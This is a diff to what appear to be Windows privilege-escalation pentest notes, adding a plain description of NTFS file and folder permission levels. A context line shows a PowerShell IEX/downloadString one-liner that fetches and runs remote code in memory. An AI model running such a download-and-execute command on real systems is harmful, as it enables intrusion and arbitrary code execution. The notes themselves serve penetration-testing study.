@@ -65,3 +65,14 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 Look at applications or services installed in Program Files directory is usually user installed
 If so use 'icacls' to see permissions of said file and who can run said file
 ```
+
+## NFTS File and Folder Permissions
+
+```
+Full control: Allows users to read, write, change, and delete files and subfolders. In addition, users can change permissions settings for all files and subdirectories.
+Modify: Allows users to read and write of files and subfolders; also allows deletion of the folder.
+Read & execute: Allows users to view and run executable files, including scripts.
+List folder contents: Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only.
+Read: Allows users to view the folder and subfolder contents.
+Write: Allows users to add files and subfolders, allows you to write to a file.
+```
